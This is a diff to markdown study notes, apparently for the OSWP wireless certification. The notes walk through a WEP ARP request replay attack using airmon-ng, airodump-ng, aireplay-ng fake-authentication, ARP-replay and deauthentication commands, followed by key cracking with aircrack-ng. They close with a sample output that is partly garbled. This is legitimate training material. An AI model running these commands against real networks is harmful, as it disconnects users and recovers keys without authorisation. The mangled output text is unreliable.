@@ -1,4 +1,4 @@
-# OWASP - ARP Request Replay Attack (WEP)
+# OSWP - ARP Request Replay Attack (Attacking the AP/Connected) (WEP)
 
 The classic ARP request replay attack is the most effective way to generate new initialization vectors (IVs), and works very reliably. The program listens for an ARP packet then retransmits it back to the access point. This, in turn, causes the access point to repeat the ARP packet with a new IV. The program retransmits the same ARP packet over and over. However, each ARP packet repeated by the access point has a new IVs. It is all these new IVs which allow you to determine the WEP key.
 
@@ -7,16 +7,15 @@ ARP is address resolution protocol: A TCP/IP protocol used to convert an IP addr
 ## Commands
 
 * Run [setup](../../setup.md) first
-* Two terminals needed here, so use `screen` or log in twice
-     * Make sure terminal is full screen
-* Make sure that there is an associated client connected to target AP
+* Up to three terminals are needed, so `screen` is your friend
+* At least one client must be associated with the AP
 
 ```bash
 # [Terminal One]
 # Set interface to monitor mode
-sudo airmon-ng start $DEVICE $CHANNEL
+sudo airmon-ng start $ADAPTER $CHANNEL
 
-# Start monitoring
+# Start monitoring - make terminal large enough to see everything
 sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE
 
 # [Terminal Two]
@@ -26,11 +25,25 @@ sudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE
 # Run the ARP replay attack
 sudo aireplay-ng --arpreplay -b $BSSID -h $INTERFACEMAC $INTERFACE
 
-# Run the deauthentication attack
+# Watch for the data to rapidly increase in the aireplay-ng window
+# To speed things up, do the next step - deauthentication attack
+
+# [Terminal Three]
+# Run the deauthentication attack (to help facilitate ARP packets for IVs)
 sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE
 
+# Get lots and lots of IVs (several minutes > 150K data ... mileage may vary though)
+# Stop everything
+
 # Crack the WEP keister (ensure that plenty of IVs are captured beforehand)
-sudo aircrack-ng $PCAP
+sudo aircrack-ng -0 $PCAP
+```
+* Look for the suscessful output - assuming enough IVs are available
+
+```
+1 potential targets                                 Got 156299 out of 155000 IVsStarting PTW attack with 156299 ivs.
+                     KEY FOUND! [ AA:BB:CC:DD:EE:FF ] (ASCII: 12345 )
+Attack wDecrypted correctly: 100%00 captured ivs.
 ```
 
 ## References
